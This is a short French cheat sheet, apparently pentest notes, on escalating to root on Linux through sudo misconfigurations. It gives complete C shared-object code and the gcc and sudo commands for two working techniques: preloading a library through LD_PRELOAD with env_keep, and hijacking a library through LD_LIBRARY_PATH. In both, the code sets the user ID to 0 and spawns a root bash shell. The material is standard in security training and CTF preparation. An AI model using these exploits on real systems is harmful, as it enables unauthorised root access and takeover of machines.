Demarrer un programme avec un autre utilisateur:

```sh
sudo -u <username> <program>
```

Lister tout les commandes que votre utilisateur peut exécuter à l'aide de `sudo`

```sh
sudo -l
```

---
### Tirer parti de LD_PRELOAD

Les étapes de ce vecteur d’élévation de privilèges peuvent être résumées comme suit :

1. Recherchez LD_PRELOAD (avec l'option `env_keep`)
2. Écrivez un code C simple compilé sous forme de fichier d'objet de partage (extension .so)
3. Exécutez le programme avec les droits sudo et l'option LD_PRELOAD pointant vers notre fichier .so

Code C:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
void _init()
{
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

Exploitation:

```sh
gcc -fPIC -shared -nostartfiles -o shell.so shell.c 
```

```sh
sudo LD_PRELOAD=/FULL_PATH_TO/shell.so [PROGRAM_NAME]
```

---
### Tirer parti de LD_LIBRARY_PATH

Les étapes de ce vecteur d’élévation de privilèges peuvent être résumées comme suit :

1. Exécutez `ldd` sur le fichier programme pour voir quelles bibliothèques partagées sont utilisées par le programme
2. Créez un objet partagé avec le même nom que l'une des bibliothèques répertoriées
3. Exécutez le programme à l'aide de sudo, tout en définissant la variable d'environnement `LD_LIBRARY_PATH` sur` /tmp` (où nous produisons l'objet partagé compilé)

Code C:

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash");
}
```

Exploitation:

```sh
ldd [PROGRAM_NAME]
```

```sh
gcc -fPIC -shared -o /tmp/[LIBRARY_NAME] shell.c
```

```sh
sudo LD_LIBRARY_PATH=/tmp [PROGRAM_NAME]
```


---
**Sources de recherche :**
- [GTFOBin](https://gtfobins.github.io/)
